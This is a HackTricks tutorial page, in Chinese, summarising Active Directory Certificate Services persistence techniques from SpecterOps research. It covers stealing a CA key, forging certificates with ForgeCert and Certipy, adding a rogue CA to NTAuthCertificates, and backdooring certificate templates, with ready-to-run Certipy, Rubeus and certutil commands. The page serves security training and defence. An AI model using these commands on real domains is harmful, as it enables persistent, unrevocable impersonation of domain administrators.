# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**这是在 [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) 中分享的域持久性技术的摘要**。请查看以获取更多详细信息。

## 使用被盗 CA 证书伪造证书 - DPERSIST1

如何判断一个证书是 CA 证书？

如果满足以下几个条件，可以确定一个证书是 CA 证书：

- 证书存储在 CA 服务器上，其私钥由机器的 DPAPI 保护，或者由操作系统支持的硬件（如 TPM/HSM）保护。
- 证书的颁发者和主题字段与 CA 的区分名称匹配。
- CA 证书中独有的存在“CA 版本”扩展。
- 证书缺少扩展密钥使用（EKU）字段。

要提取此证书的私钥，可以通过 CA 服务器上的 `certsrv.msc` 工具使用内置 GUI 进行支持的方法。然而，这个证书与系统中存储的其他证书没有区别；因此，可以应用 [THEFT2 技术](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) 进行提取。

证书和私钥也可以使用 Certipy 通过以下命令获得：
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
在获取 `.pfx` 格式的 CA 证书及其私钥后，可以使用像 [ForgeCert](https://github.com/GhostPack/ForgeCert) 这样的工具生成有效的证书：
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> 目标用户必须处于活动状态并能够在Active Directory中进行身份验证，以使证书伪造过程成功。伪造特殊账户（如krbtgt）的证书是无效的。

此伪造证书将保持**有效**，直到指定的结束日期，并且**只要根CA证书有效**（通常为5到**10年以上**）。它对**机器**也是有效的，因此结合**S4U2Self**，攻击者可以**在任何域机器上保持持久性**，只要CA证书有效。\
此外，使用此方法**生成的证书**是**无法被撤销**的，因为CA并不知道它们的存在。

## 信任恶意CA证书 - DPERSIST2

`NTAuthCertificates`对象被定义为包含一个或多个**CA证书**，这些证书在其`cacertificate`属性中，Active Directory（AD）利用该属性。**域控制器**的验证过程涉及检查`NTAuthCertificates`对象中是否有与身份验证**证书**的颁发者字段中指定的**CA**匹配的条目。如果找到匹配项，则继续进行身份验证。

攻击者可以将自签名CA证书添加到`NTAuthCertificates`对象中，前提是他们控制此AD对象。通常，只有**企业管理员**组的成员，以及**域管理员**或**森林根域**中的**管理员**，才被授予修改此对象的权限。他们可以使用`certutil.exe`通过命令`certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA126`编辑`NTAuthCertificates`对象，或者使用[**PKI健康工具**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool)。

此功能在与之前概述的涉及ForgeCert动态生成证书的方法结合使用时尤其相关。

## 恶意错误配置 - DPERSIST3

通过**AD CS**组件的**安全描述符修改**实现**持久性**的机会很多。"[域提升](domain-escalation.md)"部分中描述的修改可以被具有提升访问权限的攻击者恶意实施。这包括向敏感组件添加“控制权限”（例如，WriteOwner/WriteDACL等），例如：

- **CA服务器的AD计算机**对象
- **CA服务器的RPC/DCOM服务器**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`**中的任何**后代AD对象或容器**（例如，证书模板容器、认证机构容器、NTAuthCertificates对象等）
- **AD组默认或由组织委派控制AD CS的权限**（例如，内置的证书发布者组及其任何成员）

恶意实施的一个示例是，具有**提升权限**的攻击者将**`WriteOwner`**权限添加到默认的**`User`**证书模板，攻击者成为该权限的主体。为了利用这一点，攻击者首先将**`User`**模板的所有权更改为自己。随后，**`mspki-certificate-name-flag`**将在模板上设置为**1**，以启用**`ENROLLEE_SUPPLIES_SUBJECT`**，允许用户在请求中提供主题备用名称。随后，攻击者可以使用**模板**进行**注册**，选择**域管理员**名称作为备用名称，并利用获得的证书进行身份验证作为DA。

{{#include ../../../banners/hacktricks-training.md}}
